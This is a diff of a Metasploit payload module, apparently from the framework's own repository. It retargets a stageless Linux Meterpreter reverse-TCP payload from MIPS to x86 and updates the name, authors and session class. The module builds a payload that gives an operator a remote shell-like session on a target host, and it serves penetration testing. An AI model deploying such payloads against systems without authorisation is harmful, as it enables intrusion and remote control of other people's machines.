@@ -3,15 +3,14 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/meterpreter_options'
 require 'msf/base/sessions/mettle_config'
-require 'msf/base/sessions/meterpreter_mipsle_linux'
+require 'msf/base/sessions/meterpreter_x86_linux'
 
 module MetasploitModule
 
-  CachedSize = 997996
+  CachedSize = 739644
 
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions
@@ -21,21 +20,23 @@ module MetasploitModule
     super(
       update_info(
         info,
-        'Name'          => 'Linux Meterpreter',
-        'Description'   => 'Run the mettle server payload (stageless)',
+        'Name'          => 'Linux Meterpreter, Reverse TCP Inline',
+        'Description'   => 'Run the Meterpreter / Mettle server payload (stageless)',
         'Author'        => [
-          'Adam Cammack <adam_cammack[at]rapid7.com>'
+          'Adam Cammack <adam_cammack[at]rapid7.com>',
+          'Brent Cook <brent_cook[at]rapid7.com>'
         ],
         'Platform'      => 'linux',
-        'Arch'          => ARCH_MIPSLE,
+        'Arch'          => ARCH_X86,
         'License'       => MSF_LICENSE,
         'Handler'       => Msf::Handler::ReverseTcp,
-        'Session'       => Msf::Sessions::Meterpreter_mipsle_Linux
+        'Session'       => Msf::Sessions::Meterpreter_x86_Linux
       )
     )
   end
 
   def generate
-    MetasploitPayloads::Mettle.new('mipsel-linux-muslsf', generate_config).to_binary :exec
+    opts = {scheme: 'tcp'}
+    MetasploitPayloads::Mettle.new('i486-linux-musl', generate_config(opts)).to_binary :exec
   end
 end
